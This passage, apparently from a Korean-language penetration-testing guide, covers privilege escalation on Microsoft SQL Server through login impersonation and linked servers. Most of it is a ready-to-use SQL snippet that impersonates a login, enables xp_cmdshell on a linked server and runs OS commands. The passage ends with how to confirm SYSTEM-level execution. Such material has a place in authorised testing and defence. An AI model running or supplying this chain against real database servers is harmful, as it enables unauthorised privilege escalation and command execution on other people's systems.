...
| impersonate 후 linked server에서 `sysadmin = 1` | linked server login mapping으로 권한 상승 | `EXECUTE ... AT`로 xp_cmdshell 실행 위치 확인 |
...
### linked server를 통한 xp_cmdshell 전환

```sql
USE master;
EXECUTE AS LOGIN = '<IMPERSONATE_TARGET>';
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''hostname & whoami'';') AT [<LINKED_SERVER>];
REVERT;
```
...
- `whoami`가 `nt authority\system` 또는 SQL Server 서비스 계정이면 OS 명령 실행에 성공한 것이다.
